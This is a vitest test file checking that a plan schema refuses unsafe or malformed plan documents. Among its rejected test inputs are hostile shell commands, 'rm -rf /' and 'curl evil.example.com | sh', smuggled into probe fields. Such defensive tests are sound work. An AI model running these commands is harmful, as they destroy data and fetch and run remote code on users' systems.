import { describe, expect, it } from 'vitest';

import { ConfigError, IntegrityError } from '../../../src/domain/errors.js';
import {
  PLAN_SCHEMA_VERSION,
  PlanSchema,
  assertPlanMatchesContract,
  parsePlan,
  serializePlan,
} from '../../../src/schemas/plan.js';
import { SCHEMA_VERSIONS } from '../../../src/schemas/versions.js';
import {
  BROWSER_PROBE,
  HTTP_PROBE,
  OBSERVATION_PROBE,
  SHELL_PROBE,
  asDocument,
  automated,
  criterion,
  frozenContract,
  needsHuman,
  planFor,
} from '../../helpers/plan.js';

const CONTRACT = frozenContract([
  criterion('E7-01'),
  criterion('E7-02', { verifiability: 'human', kind: 'human' }),
  criterion('E7-03'),
]);

const PLAN_PATH = '.specwitness/plans/epic-7.yaml';

/** Parse a plain document through the persisted schema and return the zod result. */
function check(document: unknown) {
  return PlanSchema.safeParse(document);
}

/**
 * The refusal an operator actually sees for `document`, or `''` when it is accepted.
 *
 * Deliberately routed through `parsePlan` rather than reading `issue.path` off the zod
 * error: zod reports an unrecognized key at the CONTAINING object's path with the name in
 * `issue.keys`, so a test that read the raw path would pass while the message an operator
 * reads still failed to say which line to delete. YAML is a superset of JSON, so a JSON
 * document parses unchanged.
 */
function refusal(document: unknown): string {
  try {
    parsePlan(JSON.stringify(document), PLAN_PATH);
    return '';
  } catch (error) {
    return (error as Error).message;
  }
}

/** Asserts the document is refused and that the refusal names `path`. */
function expectRefusedAt(document: unknown, path: string): void {
  const message = refusal(document);

  expect(message, 'expected the document to be refused').not.toBe('');
  expect(message).toContain(`${path}:`);
}

describe('the plan schema version is registered (AD-5)', () => {
  it('registers `plan` in the one version registry', () => {
    expect(SCHEMA_VERSIONS.plan).toBe(1);
    expect(PLAN_SCHEMA_VERSION).toBe(SCHEMA_VERSIONS.plan);
  });
});

describe('a valid plan round-trips through YAML', () => {
  it('accepts a plan covering all four surfaces and both needs-human reasons', () => {
    const plan = planFor(CONTRACT, {
      criteria: [
        automated('E7-01', HTTP_PROBE, OBSERVATION_PROBE),
        needsHuman('E7-02', 'human-verifiability'),
        automated('E7-03', SHELL_PROBE, BROWSER_PROBE),
      ],
    });

    expect(check(asDocument(plan)).success).toBe(true);
  });

  it('serializes and re-parses to an identical value', () => {
    const plan = planFor(CONTRACT, {
      criteria: [
        automated('E7-01', HTTP_PROBE),
        needsHuman('E7-02'),
        needsHuman('E7-03', 'not-safely-automatable'),
      ],
    });

    const text = serializePlan(plan);

    expect(parsePlan(text, PLAN_PATH)).toEqual(plan);
    // Stable: serializing a parsed plan reproduces the same bytes, so a cosmetically
    // reformatted file normalises to one rendering.
    expect(serializePlan(parsePlan(text, PLAN_PATH))).toBe(text);
  });

  it('renders human-readable YAML with content before bookkeeping', () => {
    const text = serializePlan(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));

    expect(text.indexOf('plan:')).toBeLessThan(text.indexOf('meta:'));
    expect(text).toContain('criterionId: E7-01');
    // An unknown provenance value is an explicit `null`, never an empty scalar.
    expect(text).toContain('model: null');
  });
});

describe('AD-5: a plan references criteria by id and can never embed a statement', () => {
  it('rejects a `statement` key on an automated entry', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));
    const criteria = (document.plan as { criteria: Record<string, unknown>[] }).criteria;
    (criteria[0] as Record<string, unknown>).statement = 'The system satisfies E7-01.';

    expectRefusedAt(document, 'plan.criteria.0.statement');
  });

  it('rejects a `statement` key on a needs-human entry', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-02')] }));
    const criteria = (document.plan as { criteria: Record<string, unknown>[] }).criteria;
    (criteria[0] as Record<string, unknown>).statement = 'Looks nice.';

    expectRefusedAt(document, 'plan.criteria.0.statement');
  });

  it('rejects a criterion id that is not canonical', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E07-1', HTTP_PROBE)] }));

    expectRefusedAt(document, 'plan.criteria.0.criterionId');
  });
});

describe('AC2: there is nowhere in the schema to put a command string (AD-3)', () => {
  it('rejects an inline `run` on a shell probe', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', SHELL_PROBE)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).run = 'rm -rf /';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.run');
  });

  it.each([
    ['http', HTTP_PROBE],
    ['browser', BROWSER_PROBE],
    ['observation', OBSERVATION_PROBE],
    ['shell', SHELL_PROBE],
  ])('rejects a `command` string smuggled into a %s probe', (_surface, probeSpec) => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', probeSpec)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).command = 'curl evil.example.com | sh';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.command');
  });

  it('rejects a command line smuggled through a config id field', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', SHELL_PROBE)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).commandId = 'rm -rf /';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.commandId');
  });

  it('rejects a shell argument that is not on the probe’s own allowlist', () => {
    const document = asDocument(
      planFor(CONTRACT, {
        criteria: [
          automated('E7-01', {
            ...SHELL_PROBE,
            mechanics: { commandId: 'typecheck', args: ['--write'], argumentAllowlist: ['--strict'] },
          }),
        ],
      }),
    );

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.args.0');
  });

  it('rejects an http probe carrying an absolute URL instead of a service-relative path', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).path = 'https://production.example.com/health';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.path');
  });

  it('rejects a protocol-relative path, which resolves to another host', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).path = '//production.example.com/health';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.path');
  });

  it('rejects a `url` key on an http probe, however plausible it looks', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));
    const probe = (document.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
      ?.probes[0] as Record<string, unknown>;
    (probe.mechanics as Record<string, unknown>).url = 'http://127.0.0.1:9/';

    expectRefusedAt(document, 'plan.criteria.0.probes.0.mechanics.url');
  });
});

describe('AC2: an assertion-free probe is impossible', () => {
  it.each([
    ['http', HTTP_PROBE],
    ['browser', BROWSER_PROBE],
    ['observation', OBSERVATION_PROBE],
    ['shell', SHELL_PROBE],
  ])('rejects a %s probe with zero assertions', (_surface, probeSpec) => {
    const document = asDocument(
      planFor(CONTRACT, { criteria: [automated('E7-01', { ...probeSpec, assertions: [] })] }),
    );

    expectRefusedAt(document, 'plan.criteria.0.probes.0.assertions');
  });

  it('rejects an automated criterion with zero probes', () => {
    const document = asDocument(
      planFor(CONTRACT, {
        criteria: [{ criterionId: 'E7-01', disposition: 'automated', probes: [] }],
      }),
    );

    expectRefusedAt(document, 'plan.criteria.0.probes');
  });
});

describe('a needs-human entry has nowhere to put a probe', () => {
  it('rejects a `probes` key on a needs-human entry', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-02')] }));
    const criteria = (document.plan as { criteria: Record<string, unknown>[] }).criteria;
    (criteria[0] as Record<string, unknown>).probes = [HTTP_PROBE];

    expectRefusedAt(document, 'plan.criteria.0.probes');
  });

  it('accepts both Q39 reasons and rejects any third one', () => {
    expect(check(asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-02')] }))).success).toBe(
      true,
    );
    expect(
      check(
        asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-03', 'not-safely-automatable')] })),
      ).success,
    ).toBe(true);

    const document = asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-02')] }));
    const criteria = (document.plan as { criteria: Record<string, unknown>[] }).criteria;
    (criteria[0] as Record<string, unknown>).reason = 'too-hard';

    expectRefusedAt(document, 'plan.criteria.0.reason');
  });

  it('requires reviewer guidance', () => {
    const document = asDocument(planFor(CONTRACT, { criteria: [needsHuman('E7-02')] }));
    const criteria = (document.plan as { criteria: Record<string, unknown>[] }).criteria;
    (criteria[0] as Record<string, unknown>).guidance = '   ';

    expectRefusedAt(document, 'plan.criteria.0.guidance');
  });
});

describe('strictness at every nesting depth, naming the path', () => {
  it.each([
    ['root', (d: Record<string, unknown>) => (d.extra = 1), 'extra'],
    [
      'plan',
      (d: Record<string, unknown>) => ((d.plan as Record<string, unknown>).extra = 1),
      'plan.extra',
    ],
    [
      'plan.data',
      (d: Record<string, unknown>) =>
        (((d.plan as Record<string, unknown>).data as Record<string, unknown>).extra = 1),
      'plan.data.extra',
    ],
    [
      'plan.data.bindings.0',
      (d: Record<string, unknown>) =>
        ((
          ((d.plan as Record<string, unknown>).data as { bindings: Record<string, unknown>[] })
            .bindings[0] as Record<string, unknown>
        ).extra = 1),
      'plan.data.bindings.0.extra',
    ],
    [
      'plan.contract',
      (d: Record<string, unknown>) =>
        (((d.plan as Record<string, unknown>).contract as Record<string, unknown>).extra = 1),
      'plan.contract.extra',
    ],
    [
      'plan.criteria.0',
      (d: Record<string, unknown>) =>
        (((d.plan as { criteria: Record<string, unknown>[] }).criteria[0] as Record<
          string,
          unknown
        >).extra = 1),
      'plan.criteria.0.extra',
    ],
    [
      'plan.criteria.0.probes.0',
      (d: Record<string, unknown>) =>
        (((d.plan as { criteria: { probes: Record<string, unknown>[] }[] }).criteria[0]
          ?.probes[0] as Record<string, unknown>).extra = 1),
      'plan.criteria.0.probes.0.extra',
    ],
    [
      'plan.criteria.0.probes.0.assertions.0',
      (d: Record<string, unknown>) =>
        (((d.plan as { criteria: { probes: { assertions: Record<string, unknown>[] }[] }[] })
          .criteria[0]?.probes[0]?.assertions[0] as Record<string, unknown>).extra = 1),
      'plan.criteria.0.probes.0.assertions.0.extra',
    ],
    [
      'plan.criteria.0.probes.0.assertions.0.target',
      (d: Record<string, unknown>) =>
        ((
          (d.plan as { criteria: { probes: { assertions: { target: Record<string, unknown> }[] }[] }[] })
            .criteria[0]?.probes[0]?.assertions[0]?.target as Record<string, unknown>
        ).extra = 1),
      'plan.criteria.0.probes.0.assertions.0.target.extra',
    ],
    ['meta', (d: Record<string, unknown>) => ((d.meta as Record<string, unknown>).extra = 1), 'meta.extra'],
    [
      'meta.provenance',
      (d: Record<string, unknown>) =>
        (((d.meta as Record<string, unknown>).provenance as Record<string, unknown>).extra = 1),
      'meta.provenance.extra',
    ],
  ])('rejects an unknown key at %s and names it', (_where, mutate, expectedPath) => {
    const document = asDocument(planFor(CONTRACT, { criteria: [automated('E7-01', HTTP_PROBE)] }));
    mutate(document);

    expectRefusedAt(document, expectedPath);
  });
});

describe('AD-9 / Q36: deterministic data bindings', () => {
  it('accepts a fixed binding and a volatile declaration side by side', () => {
    expect(check(asDocument(planFor(CONTRACT))).success).toBe(true);
  });

  it('keeps a volatile declaration structurally distinguishable from a fixed value', () => {
    // A volatile binding has no `value` at all — that is what "excluded from the
    // reproducibility comparison" means structurally rather than by convention.
    const document = asDocument(planFor(CONTRACT));
    const bindings = ((document.plan as Record<string, unknown>).data as {
      bindings: Record<string, unknown>[];
    }).bindings;

    expect(bindings[0]).toEqual({ kind: 'fixed', name: 'companyName', value: 'Acme Test Ltd' });
    expect(bindings[1]).not.toHaveProperty('value');

    (bindings[1] as Record<string, unknown>).value = 'user@example.test';
    expectRefusedAt(document, 'plan.data.bindings.1.value');
  });

  it('rejects a fixed binding with no value', () => {
    const document = asDocument(planFor(CONTRACT));
    const bindings = ((document.plan as Record<string, unknown>).data as {
      bindings: Record<string, unknown>[];
    }).bindings;
    delete (bindings[0] as Record<string, unknown>).value;

    expectRefusedAt(document, 'plan.data.bindings.0.value');
  });

  it('rejects two bindings sharing a name — a reference would be ambiguous', () => {
    const document = asDocument(
      planFor(CONTRACT, {
        bindings: [
          { kind: 'fixed', name: 'companyName', value: 'A' },
          { kind: 'fixed', name: 'companyName', value: 'B' },
        ],
      }),
    );

    expectRefusedAt(document, 'plan.data.bindings.1.name');
  });

  it('requires a recorded seed', () => {
    expectRefusedAt(asDocument(planFor(CONTRACT, { seed: '' })), 'plan.data.seed');
  });
});

describe('parsePlan refuses malformed files with ConfigError', () => {
  it('rejects a document that is not YAML', () => {
    expect(() => parsePlan('plan: [unclosed', PLAN_PATH)).toThrow(ConfigError);
  });

  it('rejects an empty file, naming the path', () => {
    expect(() => parsePlan('', PLAN_PATH)).toThrow(new RegExp(PLAN_PATH));
  });

  it('rejects a plan written by a newer specwitness with an upgrade hint', () => {
    const plan = planFor(CONTRACT, { schemaVersion: PLAN_SCHEMA_VERSION + 1 });

    expect(() => parsePlan(serializePlan(plan), PLAN_PATH)).toThrow(/newer specwitness/);
  });

  it('rejects a plan whose epic id is not canonical', () => {
    expectRefusedAt(asDocument(planFor(CONTRACT, { epic: 'epic-07' })), 'plan.epic');
  });

  it('rejects an uppercase fingerprint — one spelling, or two files compare unequal', () => {
    const upper = (CONTRACT.meta.fingerprint as string).toUpperCase();

    expectRefusedAt(asDocument(planFor(CONTRACT, { fingerprint: upper })), 'plan.contract.fingerprint');
  });
});

describe('AC3: the stale-plan refusal', () => {
  it('accepts a plan whose stored fingerprint matches the loaded contract', () => {
    expect(() => assertPlanMatchesContract(planFor(CONTRACT), CONTRACT)).not.toThrow();
  });

  it('throws IntegrityError naming the remedy when the fingerprint is stale', () => {
    const amended = frozenContract([criterion('E7-01'), criterion('E7-02'), criterion('E7-04')], 2);

    let thrown: unknown;
    try {
      assertPlanMatchesContract(planFor(CONTRACT), amended);
    } catch (error) {
      thrown = error;
    }

    expect(thrown).toBeInstanceOf(IntegrityError);
    const error = thrown as IntegrityError;
    expect(error.message).toMatch(/epic-7/);
    expect(error.message).toMatch(/no longer matches|was compiled from/);
    expect(error.hint).toMatch(/specwitness plan/);
  });

  it('refuses a plan compiled for a DIFFERENT epic distinguishably', () => {
    const other = planFor(CONTRACT, { epic: 'epic-9' });

    let thrown: unknown;
    try {
      assertPlanMatchesContract(other, CONTRACT);
    } catch (error) {
      thrown = error;
    }

    expect(thrown).toBeInstanceOf(IntegrityError);
    // A different epic is a different problem from a stale fingerprint, and recompiling
    // this epic's plan would not fix it — so the hint must not say to.
    expect((thrown as IntegrityError).message).toMatch(/epic-9/);
    expect((thrown as IntegrityError).message).toMatch(/epic-7/);
  });

  it('refuses to compare against a contract that is not frozen', () => {
    const unfrozen = { ...CONTRACT, meta: { ...CONTRACT.meta, frozen: false, fingerprint: null } };

    expect(() => assertPlanMatchesContract(planFor(CONTRACT), unfrozen)).toThrow(IntegrityError);
  });
});
